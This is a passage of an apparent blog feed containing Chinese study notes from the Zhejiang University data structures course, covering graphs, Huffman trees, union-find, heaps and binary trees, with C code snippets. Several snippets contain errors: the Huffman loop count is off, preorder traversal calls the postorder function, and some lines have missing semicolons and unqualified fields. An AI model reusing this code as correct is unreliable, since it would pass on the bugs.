src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/12.png" alt="12"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">AdjVNode</span>* <span class="title">PtrToAdjVNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AdjVNode</span>&#123;</span></span><br><span class="line">Vertex AdjV; <span class="comment">//邻接表下标</span></span><br><span class="line">WeightType Weight; <span class="comment">//边权重</span></span><br><span class="line">PtrToAdjVNode Next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span>&#123;</span></span><br><span class="line">PtrToAdjVNode FirstEdge;</span><br><span class="line">DataType Data; <span class="comment">//存放顶点数据</span></span><br><span class="line">&#125;AdjList[MaxVertexNumber]; <span class="comment">//AdjList是邻接表类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LGraphStruct</span>* <span class="title">LGraph</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LGraphStruct</span>&#123;</span></span><br><span class="line"><span class="type">int</span> Nv; <span class="comment">//顶点数</span></span><br><span class="line"><span class="type">int</span> Ne; <span class="comment">//边数</span></span><br><span class="line">AdjList G; <span class="comment">//邻接表</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>初始化一个有VertexNum个顶点但没有边的图</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/13.png" alt="13"></p><p>向LGraph中插入边</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/14.png" alt="14"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【浙大数据结构】哈夫曼树</title>
      <link href="/2023/02/20/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/"/>
      <url>/2023/02/20/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>带权路径长度(WPL)：设二叉树有n个<strong>叶结点</strong>，每个叶结点带有权值<strong>w<del>k</del></strong>,从根结点到每个叶结点的长度为<strong>l<del>k</del></strong>，则每个叶结点的带权路径长度之和就是：<br>$$<br>WPL &#x3D; \sum_{n&#x3D;1}^n{w_kl_k}<br>$$<br>最优二叉树或<strong>哈夫曼树</strong>：WPL最小的二叉树</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/00.png" alt="00"></p><h4 id="哈夫曼树的构造"><a href="#哈夫曼树的构造" class="headerlink" title="哈夫曼树的构造"></a>哈夫曼树的构造</h4><p>每次把权值最小的两棵树合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">HuffmanTree</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line"><span class="type">int</span> Weight;</span><br><span class="line">HuffmanTree Left;</span><br><span class="line">HuffmanTree Right;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">HeapStruct</span>* <span class="title">Heap</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HeapStruct</span>&#123;</span></span><br><span class="line">HuffmanTree* Elements; <span class="comment">// Elements是一个数组，元素为指向TreeNode的指针</span></span><br><span class="line"><span class="type">int</span> Size;</span><br><span class="line"><span class="type">int</span> Capacity;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">BuildMinHeap</span><span class="params">(Heap H)</span>; <span class="comment">//按照权值将H中的Elements[]排成最小堆</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">DeleteMin</span><span class="params">(Heap H)</span>; <span class="comment">//返回H最小结点的地址</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insert</span><span class="params">(Heap H, HuffmanTree T)</span>;<span class="comment">// 将指针T插入H中</span></span><br><span class="line"></span><br><span class="line">HuffmanTree <span class="title function_">Huffman</span><span class="params">(Heap H)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">HuffmanTree T = nullptr;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; H-&gt;Size; i++)&#123; <span class="comment">//进行Size-1次处理</span></span><br><span class="line">T = (HuffmanTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">T-&gt;Left = DeleteMin(H);</span><br><span class="line">T-&gt;Right = DeleteMin(H);</span><br><span class="line">T-&gt;Weight = T-&gt;Left-&gt;Weight + T-&gt;Right-&gt;Weight;</span><br><span class="line">Insert(H, T);<span class="comment">// 将新生成的T塞回H里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//for循环结束后H中只剩下一个元素，即T指向的元素的地址</span></span><br><span class="line"></span><br><span class="line">T = DeleteMin(H); <span class="comment">//这一步意义不大，猜测是为了清空 H</span></span><br><span class="line"><span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="哈夫曼树的特点"><a href="#哈夫曼树的特点" class="headerlink" title="哈夫曼树的特点"></a>哈夫曼树的特点</h4><ul><li>没有度为1的结点</li><li>n个叶结点的哈夫曼树共有2n-1个结点 （由&#x3D;&#x3D;n<del>2</del> &#x3D; n<del>0</del> - 1&#x3D;&#x3D;得出）</li><li>哈夫曼树的任意非叶结点的<strong>左右子树</strong>交换后任是哈夫曼树</li><li>对同一组权值{w<del>1</del>, w<del>2</del>, …, w<del>n</del>},<strong>存在</strong>不同构的两颗哈夫曼树<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/01.png" alt="00"></li></ul><h4 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h4><p>![屏幕截图 2023-02-20 134636](C:\Users\Lenovo\Pictures\Typora\屏幕截图 2023-02-20 134636.png)</p><ul><li>怎么进行不等长编码?</li><li>怎么避免二义性?<br>  <img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/03.png" alt="00"><br>  ![屏幕截图 2023-02-20 134846](C:\Users\Lenovo\Pictures\Typora\屏幕截图 2023-02-20 134846.png)</li></ul><h5 id="二叉树用于编码"><a href="#二叉树用于编码" class="headerlink" title="二叉树用于编码"></a>二叉树用于编码</h5><p>用二叉树进行编码：</p><ol><li>左右分支：0、1</li><li>字符只在叶结点</li></ol><p>当字符存在于二叉树的叶结点上时，就不会产生二义性</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/04.png" alt="00"><br>![屏幕截图 2023-02-20 135235](C:\Users\Lenovo\Pictures\Typora\屏幕截图 2023-02-20 135235.png)</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/05.png" alt="00"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【浙大数据结构】集合</title>
      <link href="/2023/02/20/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E9%9B%86%E5%90%88/"/>
      <url>/2023/02/20/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><ul><li>集合运算：交、并、补、差，判定一个元素是否属于某一集合</li><li>并查集：集合并、查某元素属于哪个集合</li><li>并查集问题中集合存储如何实现？<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E9%9B%86%E5%90%88/00.png" alt="00"></li></ul><p>如何实现：</p><ul><li>可以用&#x3D;&#x3D;树结构&#x3D;&#x3D;表示集合，树的每个结点代表一个&#x3D;&#x3D;集合元素&#x3D;&#x3D;</li></ul><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E9%9B%86%E5%90%88/01.png" alt="00"></p><p>​     由链表实现，采用&#x3D;&#x3D;双亲表示法&#x3D;&#x3D;由子结点找到父结点，从而找到子结点从属哪个集合</p><p>但是还有更好的表示方法，采用数组表示法<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E9%9B%86%E5%90%88/02.png" alt="00"></p><h4 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h4><ol><li>查找某个元素所在集合（用根结点表示）</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Find</span><span class="params">(SetType* S, ElementType X)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//MaxSize是全局变量，表示数组S的最大长度</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MaxSize &amp;&amp; S[i].Data != X; i++); <span class="comment">//遍历查找X的下标</span></span><br><span class="line">    <span class="keyword">if</span>(i &gt;= MaxSize)<span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">//未找到X</span></span><br><span class="line">    <span class="keyword">for</span>(; S[i].Parent &gt;= <span class="number">0</span>; i = S[i].Parent);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>集合的并运算</li></ol><ul><li>分别找到X1和X2两个元素所在集合树的根结点</li><li>如果它们不同根，则将其中一个根结点的父结点指针另一个根结点的下标</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Union</span><span class="params">(SetType* S, ElementType X1, ElementType X2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> Root1, Root2;</span><br><span class="line">    Root1 = Find(S, X1);</span><br><span class="line">    Root2 = Find(S, X2);</span><br><span class="line">    <span class="keyword">if</span>(Root1 != Root2)&#123;</span><br><span class="line">S[Root2].Parent = Root1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E9%9B%86%E5%90%88/03.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E9%9B%86%E5%90%88/04.png" alt="00"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【浙大数据结构】堆</title>
      <link href="/2023/02/10/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E5%A0%86/"/>
      <url>/2023/02/10/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E5%A0%86/</url>
      
        <content type="html"><![CDATA[<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><h4 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h4><ul><li>优先队列(Priority Queue):特殊的“队列”,取出元素的顺序是依照元素的优先权（关键字）大小，而不是元素进入队列的先后顺序</li></ul><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%A0%86/00.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%A0%86/01.png" alt="00"></p><p>堆的两个特性：</p><ul><li>结构性：用数组表示的完全二叉树；</li><li>有序性：任一结点的根结点是其子树所有结点的最大值（或最小值）</li><li>“最大堆（MaxHeap）”，也称“大顶堆”：最大值</li><li>“最小堆（MinHeap）”，也称“小顶堆”：最小值</li></ul><p>####堆的抽象数据类型描述</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%A0%86/02.png" alt="00"></p><p>最大堆的创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">HeapStruct</span>* <span class="title">MaxHeap</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HeapStruct</span>&#123;</span></span><br><span class="line">    ElementType* Elements;<span class="comment">//存储堆元素的数组</span></span><br><span class="line">    <span class="type">int</span> Size;<span class="comment">//堆的当前元素个数</span></span><br><span class="line">    <span class="type">int</span> Capacity;<span class="comment">//堆的最大容量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">MaxHeap <span class="title function_">Create</span><span class="params">(<span class="type">int</span> MaxSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    MaxHeap H = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> HeapStruct));</span><br><span class="line">    H-&gt;Elements = <span class="built_in">malloc</span>((MaxSize+<span class="number">1</span>) * <span class="keyword">sizeof</span>(ElementType))<span class="comment">//0号元素做哨兵，1—MaxSize号元素才有作用</span></span><br><span class="line">    H-&gt;Size = <span class="number">0</span>;</span><br><span class="line">    H-&gt;Capacity = MaxSize;</span><br><span class="line">    H-&gt;Elements[<span class="number">0</span>] = MaxData;<span class="comment">//定义哨兵为大于堆中所有可能元素的值，便于以后更快操作</span></span><br><span class="line">    <span class="keyword">return</span> H;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆的插入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先插入数组末尾，然后一路上升</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insert</span><span class="params">(MaxHeap H, ElementType item)</span><span class="comment">//从下往上操作</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    H-&gt;Elements[<span class="number">0</span>] = item;<span class="comment">//定义哨兵</span></span><br><span class="line">    <span class="keyword">if</span>(isFull(H))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;最大堆已满&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = ++H-&gt;Size; item &gt; H-&gt;Elements[i / <span class="number">2</span>]; i /= <span class="number">2</span>)&#123;</span><br><span class="line">H-&gt;Elements[i] = H-&gt;Elements[i / <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    H-&gt;Elements[i] = item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆的删除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拿数组最后一个元素顶替被删除元素，然后一路下降</span></span><br><span class="line">ElementType <span class="title function_">Delete</span><span class="params">(MaxHeap H)</span><span class="comment">//将最后一个元素拷贝，从上往下查找该元素能待的位置</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> Parent, Child;</span><br><span class="line">    ElementType Maxitem, temp;</span><br><span class="line">    Maxitem = H-&gt;Elements[<span class="number">1</span>];</span><br><span class="line">    temp = H-&gt;Elements[H-&gt;Size--];</span><br><span class="line">    <span class="keyword">for</span>(Parent = <span class="number">1</span>;Parent * <span class="number">2</span> &lt;= H-&gt;Size;Parent = Child)&#123;</span><br><span class="line">        Child = Parent * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(Child &lt; H-&gt;Size &amp;&amp; H-&gt;Elements[Child] &lt; H-&gt;Elements[Child + <span class="number">1</span>])</span><br><span class="line">            Child++;</span><br><span class="line">        <span class="keyword">if</span>(temp &gt; Elements[Child])<span class="keyword">break</span>;</span><br><span class="line">        Elements[Parent] = Elements[Child];</span><br><span class="line">    &#125;</span><br><span class="line">    Elements[Parent] = temp;</span><br><span class="line">    <span class="keyword">return</span> Maxitem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆的建立</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PerDown</span><span class="params">(Heap H, <span class="type">int</span> Index)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> Parent, Child;</span><br><span class="line"><span class="type">int</span> item = H-&gt;Data[Index];</span><br><span class="line"><span class="keyword">for</span>(Parent = Index; Parent * <span class="number">2</span> &lt;= H-&gt;Size; Parent = Child)&#123;</span><br><span class="line">Child = Parent * <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(Child &lt; H-&gt;Size &amp;&amp; H-&gt;Data[Child] &lt; H-&gt;Data[Child + <span class="number">1</span>])</span><br><span class="line">Child++;</span><br><span class="line"><span class="keyword">if</span>(item &gt; H-&gt;Data[Child])<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">H-&gt;Data[Parent] = H-&gt;Data[Child];</span><br><span class="line">&#125;</span><br><span class="line">H-&gt;Data[Parent] = item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">BuildHeap</span><span class="params">(Heap H)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = H-&gt;Size / <span class="number">2</span>; i &gt; <span class="number">0</span>; i--)&#123;</span><br><span class="line">PerDown(H, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【浙大数据结构】树</title>
      <link href="/2023/02/08/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E6%A0%91/"/>
      <url>/2023/02/08/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><hr><h4 id="基本术语"><a href="#基本术语" class="headerlink" title="基本术语"></a>基本术语</h4><ol><li>结点的度(Degree)：结点的子树个数</li><li>树的度：树的所有结点中最大的度数</li><li>叶结点(Leaf)：度为0的结点</li><li>父结点(Parent)：有子树的结点是其子树根结点的父结点</li><li>子结点(Child)</li><li>兄弟结点(Sibling)</li><li>路径和路径长度：从结点n<del>1</del>到n<del>k</del>的路径为一个结点序列n<del>1</del>，n<del>2</del>，… ，n<del>k</del>， n<del>i</del>是n<del>i+1</del>的父结点。路径所包含的&#x3D;&#x3D;个数&#x3D;&#x3D;为路径的长度</li><li>祖先结点(Ancestor)</li><li>子孙结点(Descendant)</li><li>结点的层次(Level)：规定根结点在1层，其它任一结点的层数是其父结点的层数加1</li><li>树的深度(Depth)：规定根结点的深度为0，树中所有结点中最大层次是这棵树的深度，深度的单位为1条路径长度</li><li>树的高度(Height)：规定最低叶结点的高度为0，高度的单位为1条路径长度<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/00.png" alt="00"></li></ol><h4 id="树的实现"><a href="#树的实现" class="headerlink" title="树的实现"></a>树的实现</h4><p>儿子-兄弟表示法</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/01.png" alt="01"></p><h4 id="特殊二叉树"><a href="#特殊二叉树" class="headerlink" title="特殊二叉树"></a>特殊二叉树</h4><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/02.png" alt="00"></p><h4 id="二叉树的几个重要性质"><a href="#二叉树的几个重要性质" class="headerlink" title="二叉树的几个重要性质"></a>二叉树的几个重要性质</h4><ul><li>一个二叉树第 <em>i</em> 层的最大结点数为：2^i-1^, i &gt;&#x3D; 1</li><li>深度为 <em>k</em> 的二叉树有最大结点总数：2^k^-1, k &gt;&#x3D; 1    2^0^ + 2^1^ + 2^2^ + … + 2^k-1^ &#x3D; 2^k^ - 1 </li><li>对任何非空二叉树T，若n<del>0</del>表示叶结点的个数、n<del>2</del>是度为2的非叶结点个数，那么两者满足关系n<del>0</del> &#x3D; n<del>2</del> + 1   由路径（边）的个数为 n<del>0</del> + n<del>1</del> + n<del>2</del> - 1 &#x3D; 2n<del>2</del> + n<del>1</del> 得出</li></ul><h4 id="二叉树的抽象数据类型定义"><a href="#二叉树的抽象数据类型定义" class="headerlink" title="二叉树的抽象数据类型定义"></a>二叉树的抽象数据类型定义</h4><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/03.png" alt="00"></p><h4 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h4><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/04.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/05.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/06.png" alt="00"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">BinTree</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> BinTree Position;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    ElementType Data;</span><br><span class="line">    BinTree Left;</span><br><span class="line">    BinTree Right;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h4><p>先序遍历</p><p>遍历过程为：</p><ol><li>访问根结点；</li><li>先序遍历其左子树；</li><li>先序遍历其右子树</li><li><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/07.png" alt="00"></li></ol><p>代码示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrderTraversal</span><span class="params">(BinTree BT)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(BT)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, BT-&gt;Data);</span><br><span class="line">        PostOrderTraversal(BT-&gt;Left);</span><br><span class="line">        PostOrderTraversal(BT-&gt;Right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中序遍历<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/08.png" alt="00"></p><p>后序遍历<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/09.png" alt="00"></p><h4 id="中序遍历非递归遍历算法"><a href="#中序遍历非递归遍历算法" class="headerlink" 